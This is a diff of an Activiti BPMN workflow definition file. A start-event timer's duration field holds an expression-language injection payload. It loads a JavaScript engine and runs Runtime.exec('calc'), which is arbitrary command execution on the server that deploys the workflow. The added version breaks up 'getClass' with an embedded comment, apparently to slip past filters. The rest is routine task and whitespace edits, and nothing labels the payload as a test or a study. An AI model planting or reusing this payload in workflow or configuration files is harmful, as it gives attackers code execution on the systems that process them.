@@ -10,18 +10,14 @@
         <startEvent id="startEvent1" name="Start" activiti:initiator="host">
             <timerEventDefinition>
                 <timeDuration>
-                   ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
+                    ${"".get<!---->Class().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
                 </timeDuration>
             </timerEventDefinition>
         </startEvent>
         <userTask id="userTask2" name="meeting2" activiti:assignee="${person}" activiti:formKey="meeting/signate">
             <multiInstanceLoopCharacteristics isSequential="false" activiti:collection="people" activiti:elementVariable="person"></multiInstanceLoopCharacteristics>
         </userTask>
-
         <userTask id="usertask3" name="meeting3" activiti:assignee="${host}" activiti:formKey="meeting/input">
-
         </userTask>
-
     </process>
-
 </definitions>
